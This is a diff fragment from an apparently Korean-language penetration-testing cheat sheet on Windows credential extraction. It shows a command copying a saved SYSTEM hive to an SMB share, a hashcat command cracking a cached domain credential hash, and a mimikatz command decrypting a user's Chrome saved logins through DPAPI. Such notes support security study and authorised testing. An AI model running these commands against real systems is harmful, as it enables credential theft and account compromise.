@@ -264,7 +264,7 @@ C:\> move system.save \\<SMB Share IP>\CompData
 ```$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt```
 
 ### DPAPI
-- DPAPI 암호화된 자격 증명은 Impacket의 [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz)와 같은 도구를 사용([DonPAPI](https://github.com/login-securite/DonPAPI) : 원격)<br/>
+- DPAPI 암호화된 자격 증명(IE, Chrome, Outlook 등)은 Impacket의 [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz)와 같은 도구를 사용([DonPAPI](https://github.com/login-securite/DonPAPI) : 원격)<br/>
 ```
 C:\Users\Public> mimikatz.exe
 mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
